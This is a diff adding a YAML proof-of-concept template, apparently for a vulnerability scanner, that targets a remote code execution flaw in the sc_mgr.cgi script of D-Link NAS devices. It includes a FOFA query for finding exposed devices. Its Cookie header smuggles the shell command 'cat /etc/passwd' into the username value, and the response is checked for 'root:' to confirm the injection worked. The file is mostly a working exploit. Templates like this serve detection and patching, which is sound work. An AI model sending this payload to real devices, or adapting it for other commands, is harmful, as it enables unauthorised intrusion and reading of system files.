@@ -1,0 +1,17 @@
+id: poc-yaml-d-link-nas-sc-mgr-cgi-rce
+info:
+  name: D-Link NAS设备 sc_mgr.cgi 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: d-link
+  fofa: body="/cgi-bin/login_mgr.cgi" && body="cmd=cgi_get_ssl_info"
+requests:
+- method: GET
+  path: /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info
+  headers:
+    Cookie: username=mopfdfsewo'& cat /etc/passwd & echo 'mopfdfsewo;
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(body,"mopfdfsewo") && !contains(body,"<")
+variables: {}
+transport: http
